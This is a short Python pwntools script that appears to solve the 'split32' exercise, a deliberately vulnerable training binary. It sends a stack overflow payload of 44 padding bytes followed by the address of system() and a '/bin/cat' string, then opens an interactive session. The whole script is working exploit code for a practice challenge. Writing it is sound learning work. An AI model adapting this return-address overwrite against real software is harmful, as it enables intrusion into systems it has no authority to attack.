from pwn import *

p = process("./split32")

sys = 0x0804861a      # system() address
bincat = 0x0804a030    # address of "/bin/cat"

payload = b"A" * 44 + p32(sys) + p32(bincat)

p.sendline(payload)
p.interactive()